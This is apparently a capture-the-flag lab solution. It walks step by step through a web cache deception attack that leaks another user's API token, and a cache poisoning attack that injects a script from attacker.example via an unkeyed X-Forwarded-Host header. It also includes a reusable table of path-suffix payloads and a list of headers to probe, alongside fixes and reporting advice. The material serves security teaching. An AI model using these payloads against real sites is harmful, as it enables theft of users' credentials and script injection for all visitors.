# Solution — Harbor

Full spoilers.

## Learning what the edge decides

Before attacking anything, map the policy from the outside using
`X-Harbor-Cache`:

```bash
curl -si http://localhost:8087/            | grep -i x-harbor-cache   # MISS  (public page)
curl -si http://localhost:8087/portal.css  | grep -i x-harbor-cache   # MISS  (static)
curl -si http://localhost:8087/login       | grep -i x-harbor-cache   # BYPASS
```

Sign in and try again:

```bash
curl -s -c jar -X POST http://localhost:8087/login \
  -d 'email=you@tenant.example&password=harbor-portal-2026'

curl -si -b jar http://localhost:8087/account/profile | grep -i x-harbor-cache
# BYPASS — as designed
```

So far the policy holds: personalised pages are never stored.

## Objective 1 — `HxBugLabs{th3_3dg3_c4ch3d_wh4t_th3_0r1g1n_p3rs0n4l1z3d}`

### The bug

Two components read the same URL and reach different conclusions.

**The edge** decides from the file extension (`edge/server.js`):

```js
const extension = extensionOf(url.pathname);
if (extension !== null && STATIC_EXTENSIONS.has(extension)) return true;  // cookies ignored
```

**The origin** treats a trailing suffix as a *format*, and falls back to
HTML when it does not recognise one (`origin/server.js`):

```js
const FORMATS = { json: "json", csv: "csv" };
return { name: segment.slice(0, dot), format: FORMATS[extension] || "html" };
```

Now ask both of them for `/account/profile.css`:

| | conclusion |
| --- | --- |
| edge | ends in `.css` → a stylesheet → static, cache it, ignore the cookie |
| origin | `profile` + unknown format `css` → render the account page as HTML |

The edge stores a fully personalised HTML page under a key that anyone can
request.

```bash
curl -si -b jar http://localhost:8087/account/profile.css | grep -i 'x-harbor-cache'
# MISS  ← it just stored your account page

curl -s http://localhost:8087/account/profile.css | grep -o 'hb_live_[a-z_]*'
# hb_live_customer_2f81c4   ← no cookie sent, your API token comes back
```

That is web cache deception, and you just did it to yourself. To make it a
finding, do it to someone else.

### Exploiting it against another user

The service desk will open a portal path while signed in as an agent.
That agent's request is what fills the cache entry:

```bash
curl -s -X POST http://localhost:8087/support/queue \
  -H 'Content-Type: application/json' \
  -d '{"url":"/account/profile.css"}'
# {"queued":true,"url":"/account/profile.css",...}
```

Wait a couple of seconds, then collect it with no session at all:

```bash
curl -si http://localhost:8087/account/profile.css | grep -i x-harbor-cache
# HIT

curl -s http://localhost:8087/account/profile.css | grep -o 'hb_live_support_[^<]*'
# hb_live_support_HxBugLabs{th3_3dg3_c4ch3d_wh4t_th3_0r1g1n_p3rs0n4l1z3d}
```

Delia Reyes' name, email, role and live support API token, served to an
anonymous visitor from the cache. Confirm the mechanism in
`/_cache/status`:

```json
{ "key": "GET /account/profile.css", "contentType": "text/html; charset=utf-8" }
```

An HTML document stored under a key the edge believed was a stylesheet.

### Root cause

**A path-parsing differential between a cache and an origin.** The
original 2017 Omer Gil research used exactly this shape, and it keeps
working because the two systems are built by different teams, configured
in different files, and are never tested against each other.

Payload family to try on any CDN-fronted target — each one confuses a
different pair of parsers:

| Suffix | Confuses |
| --- | --- |
| `/account/profile.css` | extension-based caching + format-suffix routing |
| `/account/profile/x.css` | caching by extension + trailing-path-tolerant routers |
| `/account/profile;x.css` | matrix-parameter handling (Java, Spring) |
| `/account/profile%00.css` | null-byte truncation at one layer only |
| `/account/profile%2fx.css` | encoded-slash normalisation differences |
| `/account/profile#.css` | fragment handled by one side, sent by the other |
| `/account/profile?x=.css` | query-in-key vs extension parsing |

Kettle's 2024 work on cache-key normalisation showed all of these still
land against current CDNs. When testing, always confirm three things
before reporting: the response was **stored** (`HIT` on a second request),
it is **retrievable without credentials**, and it contains **another
user's** data — not just your own.

The fixes are on both sides, and both are needed:

- **Edge:** decide cacheability from the origin's `Cache-Control`, not
  from the URL. Never store a response carrying `Set-Cookie` or
  `Cache-Control: private`.
- **Origin:** send `Cache-Control: no-store, private` on every
  personalised response, and reject unknown format suffixes with a 404
  instead of silently rendering HTML.

## Objective 2 — `HxBugLabs{unk3y3d_h34d3r_1n_4_sh4r3d_r3sp0ns3}`

### The bug

The origin builds absolute asset URLs when the proxy tells it which brand
host the request arrived on:

```js
function assetOrigin(req) {
  const forwarded = String(req.headers["x-forwarded-host"] || "").split(",")[0].trim();
  if (!forwarded) return "";
  return `${proto}://${forwarded}`;
}
```

Confirm the header reaches the origin and changes the response:

```bash
curl -s http://localhost:8087/ | grep -o '<script src="[^"]*"'
# <script src="/portal.js"

curl -s http://localhost:8087/ -H 'X-Forwarded-Host: attacker.example' | grep -o '<script src="[^"]*"'
# <script src="http://attacker.example/portal.js"
```

The response depends on `X-Forwarded-Host`. Now check the key:

```js
function cacheKey(req, url) {
  return `${req.method} ${url.pathname}${url.search}`;
}
```

Method and URL. **The header that changed the response is not in the key
that identifies it** — the definition of an unkeyed input. Whatever the
next request stores is what every subsequent visitor receives.

### Exploiting it

`/` is a cacheable public page, so you need your poisoned request to be
the one that populates the entry. If a clean copy is already stored you
would only get a `HIT`, so clear it first — `/_cache/flush` is the ops
endpoint the edge exposes, and on a real target you would instead wait
out the TTL or find a cache buster.

```bash
curl -s http://localhost:8087/_cache/flush
curl -s -o /dev/null http://localhost:8087/ -H 'X-Forwarded-Host: attacker.example'
```

Now fetch the portal the way any visitor would — no special headers:

```bash
curl -s http://localhost:8087/ | grep -o '<script src="[^"]*"'
# <script src="http://attacker.example/portal.js"
```

Every anonymous visitor now loads JavaScript from a host you chose. The
integrity monitor, which fetches `/` like an ordinary browser, records it:

```bash
curl -s http://localhost:8087/api/incidents | python3 -m json.tool
```

```json
{
  "servedFrom": "HIT",
  "scripts": ["http://attacker.example/portal.js"],
  "finding": "portal served a script from a host outside the canonical domain",
  "incidentToken": "HxBugLabs{unk3y3d_h34d3r_1n_4_sh4r3d_r3sp0ns3}"
}
```

`servedFrom: HIT` is the important field: the monitor did not send your
header, it received your response.

### Root cause

**An unkeyed input reaching the response body of a shared cache entry.**
One request, sent once, changes what everyone else gets for the lifetime
of the entry. The impact ceiling is stored XSS against every visitor,
without ever touching a form field.

The headers worth testing on any cached endpoint, in rough order of hit
rate:

`X-Forwarded-Host` · `X-Host` · `X-Forwarded-Server` ·
`X-Forwarded-Scheme` · `X-Original-URL` · `X-Rewrite-URL` ·
`X-Forwarded-Port` · `X-Forwarded-Prefix`

Param Miner (Burp) exists to guess these at scale — it diffs responses
against a wordlist of thousands of header and parameter names. The
methodology is unchanged since Kettle's original *Practical Web Cache
Poisoning*: find an unkeyed input, prove it changes the response, prove
the response is cached, then prove a request without the input receives
it.

Fixes:

- Do not reflect request headers into responses at all. If white-label
  hosting needs a hostname, resolve it from the tenant record.
- If a header must influence the response, **it must be in the cache
  key** — `Vary`, or an explicit custom-key configuration at the edge.
- Strip inbound `X-Forwarded-*` at the edge and set them yourself. A
  header the client can send is not a header the origin should trust.

## Notes for the report

Two separate submissions. They share a component but the root causes,
severities and owners are different.

- **Objective 1 — Web cache deception.** High. The proof a triager needs
  is three requests in order: the agent's request that stored the entry,
  your unauthenticated `HIT`, and the `/_cache/status` line showing an
  HTML content type under a `.css` key. Name the other user's data you
  retrieved — the live API token is what makes this High rather than an
  information leak.
- **Objective 2 — Cache poisoning via unkeyed `X-Forwarded-Host`.**
  High-to-Critical depending on whether the host you inject can actually
  serve script. Say plainly that you did not register the domain and did
  not host anything on it; a poisoning PoC that points at a domain you
  control is stronger evidence and a much worse idea on someone else's
  production cache. Poison to a nonexistent host, screenshot the cached
  response, and let the report explain the ceiling.

For both, include the TTL you measured and state that the entry expires
on its own. Programs treat "permanent" and "60 seconds" very differently,
and being the one who says it first is how you keep the finding credible.
